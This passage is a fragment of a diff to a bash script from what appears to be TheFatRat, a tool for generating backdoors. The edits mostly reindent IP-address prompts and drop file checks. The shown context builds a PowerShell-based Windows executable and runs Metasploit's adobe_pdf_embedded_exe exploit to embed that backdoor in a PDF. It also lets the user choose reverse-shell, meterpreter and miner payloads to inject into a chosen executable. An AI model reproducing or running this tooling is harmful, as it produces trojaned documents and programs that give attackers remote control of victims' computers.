-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					$COMPILER -Wall -mwindows icons/icon.res $paycom -o "output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc powershell_attack.txt $paycom
 					sleep 2
@@ -2148,11 +2050,11 @@ fi
 					then
 					echo
 					echo -e $yellow"  Worked on Adobe Reader v8.x, v9.x / Windows XP SP3 / Windows 7/Vista ( English )"
-					echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+					  echo -e $okegreen""
+					  echo -e $yellow "  Your local IP address is : $lanip"
+					  echo -e $yellow "  Your public IP address is : $publicip"
+					  echo -e $yellow "  Your Hostname is : $hostn"
+					  echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -2171,19 +2073,9 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport
+					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
 					echo ""
-power=$path/powershell_attack.txt
-if [ ! -f "$power" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $power"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 
 					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
 					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
@@ -2193,30 +2085,11 @@ fi
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $pdfcom
 					echo
-if [ ! -f "$pdfcom" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Unable to find $pdfcom"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					$COMPILER -Wall -mwindows icons/icon.res $pdfcom -o "$path/output/backdoor_for_pdf.exe" > /dev/null 2>&1
 					sleep 2
 					echo " Wait for embed exe to pdf ....  "
 					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
 					echo ""
-msout=~/.msf4/local/$fira.pdf
-if [ ! -f "$msout" ]
-                                        then
-                                        echo -e $red ""
-                                        echo "Msfconsole was unale to compile $fira.pdf"
-                                        echo -e $okegreen ""
-read -rsp $'Press any key to return to return to menu\n' -n 1 key
-clear
-PwnWinds
-fi
 					mv ~/.msf4/local/$fira.pdf $path/output/$fira.pdf
 					rm unicorn.rc powershell_attack.txt
 					echo -e $okegreen""
@@ -2229,10 +2102,10 @@ fi
         then
         echo ""
         echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+        echo -e $yellow "  Your local IP address is : $lanip"
+        echo -e $yellow "  Your public IP address is : $publicip"
+        echo -e $yellow "  Your Hostname is : $hostn"
+        echo -e $okegreen ""
         echo -ne "  SET LHOST : ";tput sgr0
         read yourip
         echo ""
@@ -2436,10 +2309,10 @@ echo -e $okegreen ""
       then
       echo ""
       echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+      echo -e $yellow "  Your local IP address is : $lanip"
+      echo -e $yellow "  Your public IP address is : $publicip"
+      echo -e $yellow "  Your Hostname is : $hostn"
+      echo -e $okegreen""
       echo -ne "  SET LHOST : ";tput sgr0
       read yourip
       echo ""
@@ -2684,7 +2557,7 @@ echo -e $okegreen""
 echo -e $yellow "Your local IP address is : $lanip"
 echo -e $yellow "Your public IP address is : $publicip"
 echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+echo -e $okegreen""
 echo -ne  $cyan"TYPE YOUR LHOST : $okegreen" ;
 read IP
 echo ""
@@ -2958,12 +2831,12 @@ menu () {
   			then
   				echo ""
   				spinlong
-  				echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
-  				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira;
+          echo -e $okegreen""
+          echo -e $yellow "  Your local IP address is : $lanip"
+          echo -e $yellow "  Your public IP address is : $publicip"
+          echo -e $yellow "  Your Hostname is : $hostn"
+          echo -e $okegreen""
+          read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira;
           embed=$(zenity --file-selection --file-filter='EXE files (exe) | *.exe' --title="Select your executable file");
   				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
   				spinlong
@@ -3171,11 +3044,11 @@ echo
       then
         echo ""
         spinlong
-echo -e $okegreen""
-echo -e $yellow "Your local IP address is : $lanip"
-echo -e $yellow "Your public IP address is : $publicip"
-echo -e $yellow "Your Hostname is : $hostn"
-echo -e $okegreen ""
+        echo -e $okegreen""
+        echo -e $yellow "  Your local IP address is : $lanip"
+        echo -e $yellow "  Your public IP address is : $publicip"
+        echo -e $yellow "  Your Hostname is : $hostn"
+        echo -e $okegreen""
         read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira;
         embed=$(zenity --file-selection --file-filter='EXE files (exe) | *.exe' --title="Select your executable file");
         payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
